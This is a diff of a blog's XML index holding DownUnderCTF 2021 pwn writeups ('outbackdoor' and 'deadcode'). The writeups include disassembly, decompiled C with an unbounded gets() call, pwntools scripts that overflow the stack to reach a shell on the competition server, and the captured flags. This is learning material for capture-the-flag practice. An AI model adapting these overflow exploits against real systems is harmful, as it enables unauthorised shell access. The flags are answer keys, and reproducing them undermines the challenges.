gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh())</span><br><span class="line"># payload = fit(&#123;</span><br><span class="line">#     32: 0xdeadbeef,</span><br><span class="line">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="line"># &#125;, length=128)</span><br><span class="line"># io.send(payload)</span><br><span class="line"># flag = io.recv(...)</span><br><span class="line"># log.success(flag)</span><br><span class="line">print(io.recv(1024))</span><br><span class="line">io.send(os.urandom(0x20-0x8)+(0xdeadc0de).to_bytes(0x8,&quot;little&quot;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>ctf</tag>
-        <tag>writeup</tag>
-        <tag>ductf</tag>
-        <tag>buffer overflow</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>[writeup][DownUnderCTF 2021] pwn-outbackdoor</title>
     <url>/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-outbackdoor/</url>
     <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
@@ -2725,6 +2725,36 @@ https://www.bsfdvbsbilibili.com
 <h2 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31921&#x27; outBackdoor</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;outBackdoor&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 31921)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh())</span><br><span class="line"># payload = fit(&#123;</span><br><span class="line">#     32: 0xdeadbeef,</span><br><span class="line">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="line"># &#125;, length=128)</span><br><span class="line"># io.send(payload)</span><br><span class="line"># flag = io.recv(...)</span><br><span class="line"># log.success(flag)</span><br><span class="line">import os</span><br><span class="line">print(io.recv(1024))</span><br><span class="line">io.send(os.urandom(0x10+0x8)+(0x401016).to_bytes(0x8,&quot;little&quot;)+(0x004011d7).to_bytes(0x8,&quot;little&quot;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>DUCTF{<a href="https://www.youtube.com/watch?v=XfR9iY5y94s%7D">https://www.youtube.com/watch?v=XfR9iY5y94s}</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>ductf</tag>
+        <tag>buffer overflow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[writeup][DownUnderCTF 2021] pwn-deadcode</title>
+    <url>/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-deadcode/</url>
+    <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>no pie enable. so we can simply overwrite.</p>
+<p>note that there are <code>gets</code> without length, which can perform <strong>buffoverflow</strong></p>
+<p><img src="/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-deadcode/20211009120913.png" alt="stack"></p>
+<p>since s is above var_8h, we can write random 16 bytes + 0xdeadc0de in 8 bytes to overwrite var_8h to value of 0xdeadc0de, which will lead us to the shell.</p>
+<span id="more"></span>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nt main (int argc, char **argv, char **envp);</span><br><span class="line">; var char *s @ rbp-0x20</span><br><span class="line">; var uint64_t var_8h @ rbp-0x8</span><br><span class="line">0x00401195      push    rbp</span><br><span class="line">0x00401196      mov     rbp, rsp</span><br><span class="line">0x00401199      sub     rsp, 0x20</span><br><span class="line">0x0040119d      mov     qword [var_8h], 0</span><br><span class="line">0x004011a5      mov     eax, 0</span><br><span class="line">0x004011aa      call    buffer_init ; sym.buffer_init</span><br><span class="line">0x004011af      lea     rdi, str.I_m_developing_this_new_application_in_C__I_ve_setup_some_code_for_the_new_features_but_it_s_not__a_live_yet. ; 0x402008 ; const char *s</span><br><span class="line">0x004011b6      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011bb      lea     rdi, str.What_features_would_you_like_to_see_in_my_app ; 0x402078 ; const char *s</span><br><span class="line">0x004011c2      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011c7      lea     rax, [s]</span><br><span class="line">0x004011cb      mov     rdi, rax   ; char *s</span><br><span class="line">0x004011ce      mov     eax, 0</span><br><span class="line">0x004011d3      call    gets       ; sym.imp.gets ; char *gets(char *s)</span><br><span class="line">0x004011d8      mov     eax, 0xdeadc0de</span><br><span class="line">0x004011dd      cmp     qword [var_8h], rax</span><br><span class="line">0x004011e1      jne     0x401200</span><br><span class="line">0x004011e3      lea     rdi, str.Maybe_this_code_isn_t_so_dead... ; 0x4020a8 ; const char *s</span><br><span class="line">0x004011ea      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011ef      lea     rdi, str.bin_sh ; 0x4020cb ; const char *string</span><br><span class="line">0x004011f6      mov     eax, 0</span><br><span class="line">0x004011fb      call    system     ; sym.imp.system ; int system(const char *string)</span><br><span class="line">0x00401200      mov     eax, 0</span><br><span class="line">0x00401205      leave</span><br><span class="line">0x00401206      ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">undefined8 main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char *s;</span><br><span class="line">    uint64_t var_8h;</span><br><span class="line">    </span><br><span class="line">    var_8h = 0;</span><br><span class="line">    buffer_init();</span><br><span class="line">    puts(</span><br><span class="line">        &quot;\nI\&#x27;m developing this new application in C, I\&#x27;ve setup some code for the new features but it\&#x27;s not (a)live yet.&quot;</span><br><span class="line">        );</span><br><span class="line">    puts(&quot;\nWhat features would you like to see in my app?&quot;);</span><br><span class="line">    gets(&amp;s);</span><br><span class="line">    if (var_8h == 0xdeadc0de) &#123;</span><br><span class="line">        puts(&quot;\n\nMaybe this code isn\&#x27;t so dead...&quot;);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31916&#x27; deadcode</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;deadcode&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 31916)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh())</span><br><span class="line"># payload = fit(&#123;</span><br><span class="line">#     32: 0xdeadbeef,</span><br><span class="line">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="line"># &#125;, length=128)</span><br><span class="line"># io.send(payload)</span><br><span class="line"># flag = io.recv(...)</span><br><span class="line"># log.success(flag)</span><br><span class="line">print(io.recv(1024))</span><br><span class="line">io.send(os.urandom(0x20-0x8)+(0xdeadc0de).to_bytes(0x8,&quot;little&quot;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}</p>
 ]]></content>
       <categories>
         <category>CTF</category>
